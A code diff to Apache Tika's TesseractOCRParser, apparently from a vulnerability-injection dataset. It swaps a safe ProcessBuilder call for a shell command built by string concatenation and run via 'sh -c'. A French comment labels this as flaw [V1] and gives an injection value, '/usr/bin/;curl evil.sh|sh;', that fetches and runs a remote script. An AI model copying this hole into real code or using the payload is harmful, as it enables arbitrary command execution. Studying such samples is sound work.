@@ -725,16 +725,15 @@ public class TesseractOCRParser extends AbstractExternalProcessParser implements
         return defaultConfig;
     }
 
-    private void preloadLangs() {
-        String[] args = new String[]{defaultConfig.getTesseractPath() + getTesseractProg(), "--list-langs"};
-
-        ProcessBuilder pb = new ProcessBuilder(args);
-
-        setEnv(pb);
+        private void preloadLangs() {
+        // [V1] le chemin de tesseract, est concaténé dans une ligne de commande
+        // interprétée par un shell. Une valeur comme "/usr/bin/;curl evil.sh|sh;" exécute
+        // des commandes arbitraires.
+        String cmd = defaultConfig.getTesseractPath() + getTesseractProg() + " --list-langs";
 
         Process process = null;
         try {
-            process = pb.start();
+            process = java.lang.Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
             getLangs(process, defaultConfig.getTimeoutSeconds());
         } catch (TikaException | IOException e) {
             LOG.warn("Problem preloading langs", e);
